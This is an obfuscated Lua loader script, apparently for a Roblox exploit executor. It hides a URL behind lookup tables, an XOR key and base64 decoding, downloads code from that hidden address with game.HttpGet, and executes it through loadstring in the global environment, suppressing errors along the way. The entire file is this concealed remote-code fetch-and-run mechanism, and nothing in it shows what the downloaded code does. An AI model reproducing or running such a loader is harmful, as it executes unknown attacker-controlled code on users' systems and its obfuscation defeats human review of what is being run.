--[[1de945ad925e]]
local _g04d89d65={53,201,181,28,72,21,59,29,199,44,122,139,131,190,42,62,84,253,163,37,133,164,184,152,118,153,204,43,177,10,145,97,77,47,239,90,117,235,228,227,41,191,89,171,219,39,223,48,182,57,107,126,241,221,200,212,45,12,197,123,40,11,211,194}
local _l64d67fe9={230,9,115,222,51,73,76,106,237,240,58,179,159,138,213,121,1,202,198,18,226,156,167,61,151,234,195,140,141,249,224,20,102,33,205,116,3,88,168,98,217,101,149,32,196,160,114,120,255,188,34,13,64,161,134,203,92,100,69,108,67,216,146,74}
local _lf5a109e6={79,16,70,99,127,66,173,46,231,103,180,208,155,17,183,172,136,236,105,4,104,86,254,250,243,14,71,109,68,111,174,244,110,22,242,125,80,209,246,233,82,225,215,178,7,112,185,176,186,193,252,247,248,128,63,218,2,35,192,50,96,94,251,65}
local _xc6e44d24={24,130,31,189,150,30,175,207,36,87,78,214,157,135,95,6,143,85,75,119,220,129,187,238,132,144,210,147,55,148,169,154,15,56,49,52,113,0,27,83,245,26,19,81,158,142,5,206,137,93,232,124,166,38,165,60,54,91,170,23,25,8,229,162}
--[[8adc15bbdc73]]
local _vaa605b1a={}
for _e894d2354=1,64 do
  _vaa605b1a[_e894d2354]=_g04d89d65[_e894d2354]
  _vaa605b1a[64+_e894d2354]=_l64d67fe9[_e894d2354]
  _vaa605b1a[128+_e894d2354]=_lf5a109e6[_e894d2354]
  _vaa605b1a[192+_e894d2354]=_xc6e44d24[_e894d2354]
end
_g04d89d65=nil;_l64d67fe9=nil;_lf5a109e6=nil;_xc6e44d24=nil
--[[54620f184270]]
local _oa516edf2={163,43,193,85,170,137,204,224}
local _l07fdeedc={128,189,45,196,100,13,203,245}
local _r96a59dd3={}
for _e894d2354=1,8 do
  _r96a59dd3[_e894d2354]=_oa516edf2[_e894d2354]
  _r96a59dd3[8+_e894d2354]=_l07fdeedc[_e894d2354]
end
_oa516edf2=nil;_l07fdeedc=nil
--[[0f9d0771a096]]
local _b05d1b8ea={63,131,219,105,1,177,213,203,26,108,95,195,87,209,102,181,93,252,134,105,119,177,223,240,38,254,131,102,172,188,20,12,177,122,219,49,54,136,204,106}
local _k7d4ad8c6={104,208,95,175,60,87,86,204,177,243,159,49,239,214,193,196,183,151,59,159,238,127,86,208,215,133,180,207,54,214,118,91,104,254,132,13,226,188,204,8}
local _r1ff58590={151,243,73,114,64,214,17,144,169,89,252,171,40,137,118,208,34,233,11,185,190,38,223,144,38,232,131,219,40,121,112,193,72,148,180,230,152,67,109,106}
local _i59d6e36a={26,139,209,232,87,120,166,54}
--[[574709a675e6]]
local _q64a68fbd={}
local _e894d2354=0
for _,b in ipairs(_b05d1b8ea) do
  _e894d2354=_e894d2354+1
  _q64a68fbd[_e894d2354]=b
end
_b05d1b8ea=nil
for _,b in ipairs(_k7d4ad8c6) do
  _e894d2354=_e894d2354+1
  _q64a68fbd[_e894d2354]=b
end
_k7d4ad8c6=nil
for _,b in ipairs(_r1ff58590) do
  _e894d2354=_e894d2354+1
  _q64a68fbd[_e894d2354]=b
end
_r1ff58590=nil
for _,b in ipairs(_i59d6e36a) do
  _e894d2354=_e894d2354+1
  _q64a68fbd[_e894d2354]=b
end
_i59d6e36a=nil
--[[c9a8c9332d03]]
local _tf3fc369f={}
for _e894d2354=1,#_q64a68fbd do
  _tf3fc369f[_e894d2354]=_vaa605b1a[_q64a68fbd[_e894d2354]+1]
end
_q64a68fbd=nil;_vaa605b1a=nil
--[[456acfc7463c]]
local _s7fae54a0={}
local _v91a1214d=#_r96a59dd3
for _e894d2354=1,#_tf3fc369f do
  local _iec36c93e=_tf3fc369f[_e894d2354]
  local _c18dc7060=_r96a59dd3[((_e894d2354-1)%_v91a1214d)+1]
  local _m7530aff8=0
  local _i67c3dca4=1
  while _iec36c93e>0 or _c18dc7060>0 do
    if _iec36c93e%2~=_c18dc7060%2 then _m7530aff8=_m7530aff8+_i67c3dca4 end
    _iec36c93e=_iec36c93e-_iec36c93e%2
    _c18dc7060=_c18dc7060-_c18dc7060%2
    _iec36c93e=_iec36c93e/2
    _c18dc7060=_c18dc7060/2
    _i67c3dca4=_i67c3dca4*2
  end
  _s7fae54a0[_e894d2354]=string.char(_m7530aff8)
end
_tf3fc369f=nil;_r96a59dd3=nil
--[[747eb1f551dc]]
local _a435ca1f3=table.concat(_s7fae54a0)
_s7fae54a0=nil
--[[b5f00a12aaea]]
local function _b64d(s)
  local b="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
  local t={}
  for i=1,#b do t[b:sub(i,i)]=i-1 end
  local r={}
  local buf=0
  local bits=0
  for i=1,#s do
    local c=s:sub(i,i)
    if c~="=" then
      local v=t[c]
      if v then
        buf=buf*64+v
        bits=bits+6
        if bits>=8 then
          bits=bits-8
          r[#r+1]=string.char(math.floor(buf/2^bits)%256)
          buf=buf%(2^bits)
        end
      end
    end
  end
  return table.concat(r)
end
--[[61e9de6f7b2d]]
local _b048be6d7=_b64d(_a435ca1f3)
_b64d=nil;_a435ca1f3=nil
--[[6ce40c11c7b1]]
if type(_b048be6d7)~="string" or #_b048be6d7<8 then
  _b048be6d7=nil
  return
end
--[[ac4bc97d6a4c]]
local _v54cd6c06=game.HttpGet
local _w245920c9,_gadf10a0f=pcall(function()
  return _v54cd6c06(game,_b048be6d7)
end)
_b048be6d7=nil;_v54cd6c06=nil
--[[310f307a999d]]
if not _w245920c9 then return end
if type(_gadf10a0f)~="string" or #_gadf10a0f<10 then
  _gadf10a0f=nil
  return
end
--[[25b460b754b9]]
local _lf7392a46=loadstring(_gadf10a0f)
_gadf10a0f=nil
if type(_lf7392a46)~="function" then return end
--[[5dd2e44da850]]
pcall(function()
  if setfenv then
    setfenv(_lf7392a46,getfenv(0))
  end
end)
--[[c44b2812d5e7]]
_lf7392a46()
_lf7392a46=nil
--[[fbec43585c0a]]